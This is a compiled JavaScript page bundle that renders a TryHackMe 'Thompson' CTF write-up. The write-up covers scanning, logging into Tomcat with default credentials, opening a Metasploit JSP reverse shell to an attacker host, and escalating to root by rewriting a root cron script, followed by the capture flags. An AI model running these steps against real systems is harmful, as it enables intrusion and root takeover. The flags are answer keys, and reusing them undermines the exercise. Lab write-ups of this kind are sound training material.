"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[6271],{3905:(t,e,n)=>{n.d(e,{Zo:()=>p,kt:()=>h});var o=n(67294);function r(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function a(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(t);e&&(o=o.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,o)}return n}function s(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?a(Object(n),!0).forEach((function(e){r(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function c(t,e){if(null==t)return{};var n,o,r=function(t,e){if(null==t)return{};var n,o,r={},a=Object.keys(t);for(o=0;o<a.length;o++)n=a[o],e.indexOf(n)>=0||(r[n]=t[n]);return r}(t,e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(t);for(o=0;o<a.length;o++)n=a[o],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(r[n]=t[n])}return r}var i=o.createContext({}),l=function(t){var e=o.useContext(i),n=e;return t&&(n="function"==typeof t?t(e):s(s({},e),t)),n},p=function(t){var e=l(t.components);return o.createElement(i.Provider,{value:e},t.children)},u="mdxType",m={inlineCode:"code",wrapper:function(t){var e=t.children;return o.createElement(o.Fragment,{},e)}},d=o.forwardRef((function(t,e){var n=t.components,r=t.mdxType,a=t.originalType,i=t.parentName,p=c(t,["components","mdxType","originalType","parentName"]),u=l(n),d=r,h=u["".concat(i,".").concat(d)]||u[d]||m[d]||a;return n?o.createElement(h,s(s({ref:e},p),{},{components:n})):o.createElement(h,s({ref:e},p))}));function h(t,e){var n=arguments,r=e&&e.mdxType;if("string"==typeof t||r){var a=n.length,s=new Array(a);s[0]=d;var c={};for(var i in e)hasOwnProperty.call(e,i)&&(c[i]=e[i]);c.originalType=t,c[u]="string"==typeof t?t:r,s[1]=c;for(var l=2;l<a;l++)s[l]=n[l];return o.createElement.apply(null,s)}return o.createElement.apply(null,n)}d.displayName="MDXCreateElement"},22181:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>i,contentTitle:()=>s,default:()=>m,frontMatter:()=>a,metadata:()=>c,toc:()=>l});var o=n(87462),r=(n(67294),n(3905));const a={},s="Thompson",c={unversionedId:"Tryhackme/Thompson/Thompson",id:"Tryhackme/Thompson/Thompson",title:"Thompson",description:"boot2root machine for FIT and bsides guatemala CTF",source:"@site/writeups/Tryhackme/Thompson/Thompson.md",sourceDirName:"Tryhackme/Thompson",slug:"/Tryhackme/Thompson/",permalink:"/writeups/Tryhackme/Thompson/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"The find command",permalink:"/writeups/Tryhackme/The find command/"},next:{title:"tmux",permalink:"/writeups/Tryhackme/Tmux/"}},i={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Thompson",id:"task-1-thompson",level:2}],p={toc:l},u="wrapper";function m(t){let{components:e,...a}=t;return(0,r.kt)(u,(0,o.Z)({},p,a,{components:e,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"thompson"},"Thompson"),(0,r.kt)("p",null,"boot2root machine for FIT and bsides guatemala CTF"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/bsidesgtthompson"},"Thompson")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Poking"),(0,r.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,r.kt)("li",{parentName:"ul"},"Metasploit (jsp_shell_reverse_tcp)"),(0,r.kt)("li",{parentName:"ul"},"Exploiting Crontab")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-thompson"},"Task 1 Thompson"),(0,r.kt)("p",null,"read user.txt and root.txt"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Thompson$ sudo nmap -A -sS -sC -sV -O 10.10.27.26\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 16:43 CEST\nNmap scan report for 10.10.27.26\nHost is up (0.038s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)\n|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)\n|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\n|_ajp-methods: Failed to get a valid response for the OPTION request\n8080/tcp open  http    Apache Tomcat 8.5.5\n|_http-favicon: Apache Tomcat\n|_http-title: Apache Tomcat/8.5.5\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=34354%PV=Y%DS=2%DC=T%G=Y%TM=5F870E\nOS:BF%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT      ADDRESS\n1   37.21 ms 10.8.0.1\n2   37.65 ms 10.10.27.26\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.66 seconds\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Thompson$ sudo /opt/dirsearch/dirsearch.py -u 10.10.27.26:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e html,php,txt\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: html, php, txt | HTTP method: GET | Threads: 20 | Wordlist size: 4658\n\nError Log: /opt/dirsearch/logs/errors-20-10-14_16-45-12.log\n\nTarget: 10.10.27.26:8080\n\nOutput File: /opt/dirsearch/reports/10.10.27.26/_20-10-14_16-45-13.txt\n\n[16:45:13] Starting:\n[16:45:17] 302 -    0B  - /docs  ->  /docs/\n[16:45:18] 302 -    0B  - /examples  ->  /examples/\n[16:45:18] 200 -   21KB - /favicon.ico\n[16:45:19] 302 -    0B  - /host-manager  ->  /host-manager/\n[16:45:20] 302 -    0B  - /manager  ->  /manager/\n\nTask Completed\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.27.26:8080/manager/html"},"http://10.10.27.26:8080/manager/html")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(24756).Z,width:"1304",height:"345"})),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'<role rolename="manager-gui"/>\n<user username="tomcat" password="s3cret" roles="manager-gui"/>\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"tomcat:s3cret")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Thompson$ msfconsole -q\n[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/smb/ms17_010_eternalblue) > use multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\nmsf5 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp\npayload => java/jsp_shell_reverse_tcp\nmsf5 exploit(multi/handler) > set lhost 10.8.106.222\nlhost => 10.8.106.222\nmsf5 exploit(multi/handler) > run -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\nmsf5 exploit(multi/handler) > [*] Started reverse TCP handler on 10.8.106.222:4444\n[*] Command shell session 1 opened (10.8.106.222:4444 -> 10.10.27.26:44296) at 2020-10-14 16:51:45 +0200\nid\n[*] exec: id\n\nuid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),132(scanner)\nmsf5 exploit(multi/handler) > sessions -i 1\n[*] Starting interaction with 1...\n\nSHELL=/bin/bash script -q /dev/null\ntomcat@ubuntu:/$ id\nid\nuid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)\ntomcat@ubuntu:/$ cd /home\ncd /home\ntomcat@ubuntu:/home$ ls\nls\njack\ntomcat@ubuntu:/home$ cd jack\ncd jack\ntomcat@ubuntu:/home/jack$ ls\nls\nid.sh  test.txt  user.txt\ntomcat@ubuntu:/home/jack$ cat user.txt\ncat user.txt\n39400c90bc683a41a8935e4719f181bf\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"tomcat@ubuntu:/home/jack$ cat /etc/crontab\ncat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n*  *    * * *   root    cd /home/jack && bash id.sh\n#\ntomcat@ubuntu:/home/jack$ cat id.sh\ncat id.sh\n#!/bin/bash\nid > test.txt\ntomcat@ubuntu:/home/jack$ printf '#!/bin/bash\\ncat /root/root.txt > test.txt' > id.sh\n<rintf '#!/bin/bash\\ncat /root/root.txt > test.txt' > id.sh\ntomcat@ubuntu:/home/jack$ cat id.sh\ncat id.sh\n#!/bin/bash\ncat /root/root.txt > test.txttomcat@ubuntu:/home/jack$ cat test.txt\ncat test.txt\nuid=0(root) gid=0(root) groups=0(root)\ntomcat@ubuntu:/home/jack$ ^[[A\ncat test.txt\nuid=0(root) gid=0(root) groups=0(root)\ntomcat@ubuntu:/home/jack$ ^[[A\ncat test.txt\nd89d5391984c0450a95497153ae7ca3a\ntomcat@ubuntu:/home/jack$\n")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"user.txt")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"39400c90bc683a41a8935e4719f181bf")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"root.txt")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"d89d5391984c0450a95497153ae7ca3a")))}m.isMDXComponent=!0},24756:(t,e,n)=>{n.d(e,{Z:()=>o});const o=n.p+"assets/images/2020-10-14_16-47-00ed58068930f245e76d47defb5bde84.png"}}]);